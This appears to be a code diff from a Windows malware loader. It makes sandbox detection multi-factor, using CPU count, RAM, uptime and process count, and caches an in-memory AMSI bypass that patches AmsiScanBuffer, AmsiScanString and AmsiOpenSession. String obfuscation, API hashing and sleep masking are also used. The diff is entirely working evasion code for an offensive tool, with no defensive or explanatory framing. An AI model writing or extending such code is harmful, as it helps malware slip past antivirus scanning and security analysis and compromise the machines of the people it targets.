@@ -38,12 +38,37 @@ VOID DeepSleep() {
     GhostSleep(sleepMs);
 }
 
-// ─── Sandbox detection ────────────────────────────────────────────────────────
+// ─── Sandbox detection (multi-factor) ────────────────────────────────────────
 static BOOL IsLikelySandbox() {
 #ifdef DEBUG
-    return FALSE; // ponytail: disabled in debug; set threshold to 60000ULL for release
+    return FALSE;
 #else
-    return GetTickCount64() < 60000ULL;
+    // Factor 1: fewer than 2 logical CPUs — VMs/sandboxes often use 1
+    SYSTEM_INFO si = {};
+    GetSystemInfo(&si);
+    if (si.dwNumberOfProcessors < 2) return TRUE;
+
+    // Factor 2: less than 2 GB physical RAM
+    MEMORYSTATUSEX ms = { sizeof(ms) };
+    if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < (2ULL << 30)) return TRUE;
+
+    // Factor 3: system uptime under 2 minutes AND single-digit process count
+    // (fresh sandbox spin-up — not just a user reboot)
+    if (GetTickCount64() < 120000ULL) {
+        // Count running processes via snapshot
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe = { sizeof(pe) };
+            DWORD count = 0;
+            if (Process32FirstW(snap, &pe)) {
+                do { ++count; } while (Process32NextW(snap, &pe));
+            }
+            CloseHandle(snap);
+            if (count < 30) return TRUE; // real Windows has 50+ on boot
+        }
+    }
+
+    return FALSE;
 #endif
 }
 
@@ -86,9 +111,18 @@ static void MakePatch3(BYTE out[3]) {
 static BYTE MakeRet() { return (BYTE)(0xFF - 0x3C); }
 
 // ─── AMSI bypass ──────────────────────────────────────────────────────────────
+// Cached: amsi.dll is only loaded once; patch verified each call but
+// LoadLibraryA is not re-issued after the first successful load.
 BOOL PatchAMSI() {
-    HMODULE hAmsi = LoadLibraryA(XS("amsi.dll"));
+    static HMODULE hAmsi = nullptr;
+    static BOOL    s_done = FALSE;
+    if (!hAmsi) {
+        // GetModuleHandleA first — avoids a new load if already mapped
+        hAmsi = GetModuleHandleA(XS("amsi.dll"));
+        if (!hAmsi) hAmsi = LoadLibraryA(XS("amsi.dll"));
+    }
     if (!hAmsi) return FALSE;
+    if (s_done) return TRUE; // already patched this session
     BYTE p3[3]; MakePatch3(p3);
     FARPROC pScan = HashProc(hAmsi, FNV("AmsiScanBuffer"));
     if (pScan) MemPatch(reinterpret_cast<PVOID>(pScan), p3, 3);
@@ -96,6 +130,7 @@ BOOL PatchAMSI() {
     if (pStr)  MemPatch(reinterpret_cast<PVOID>(pStr),  p3, 3);
     FARPROC pOpen = HashProc(hAmsi, FNV("AmsiOpenSession"));
     if (pOpen) MemPatch(reinterpret_cast<PVOID>(pOpen), p3, 3);
+    if (pScan) s_done = TRUE;
     return (pScan != nullptr);
 }
 
